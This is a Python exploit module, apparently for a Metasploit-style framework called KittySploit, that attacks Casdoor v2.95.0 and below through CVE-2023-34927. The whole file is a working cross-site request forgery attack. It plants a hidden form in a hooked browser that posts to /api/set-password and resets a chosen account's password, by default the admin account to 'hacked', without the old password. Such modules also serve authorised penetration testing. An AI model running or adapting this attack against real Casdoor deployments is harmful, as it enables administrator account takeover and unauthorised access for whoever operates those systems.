from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "Casdoor CVE-2023-34927 CSRF",
		"description": "Casdoor v2.95.0 and below - CSRF vulnerability in /api/set-password endpoint (CVE-2023-34927)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
        "CVE": "2023-34927",
		"references": [
			"https://github.com/casdoor/casdoor"
		],
	}
	
	target = OptString("http://localhost:8000", "Target Casdoor URL (with http://)", required=True)
	user_owner = OptString("built-in", "User owner (default: built-in)", required=True)
	username = OptString("admin", "Username to change password for", required=True)
	new_password = OptString("hacked", "New password to set", required=True)

	def run(self):
		"""Execute CSRF POST attack to change user password in Casdoor"""
		form_data = [
			f'<form method="POST" action="{self.target}/api/set-password">',
			f'<input type="hidden" name="userOwner" value="{self.user_owner}" />',
			f'<input type="hidden" name="userName" value="{self.username}" />',
			f'<input type="hidden" name="newPassword" value="{self.new_password}" />',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/api/set-password")
		print_info(f"User Owner: {self.user_owner}")
		print_info(f"Username: {self.username}")
		print_info(f"New password: {self.new_password}")
		print_warning("CVE-2023-34927: This vulnerability allows changing passwords without old password authentication")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent for user: {self.username}")
			print_info(f"New password: {self.new_password}")
			return True
		else:
			fail.CSRFPostFailed()
		return False

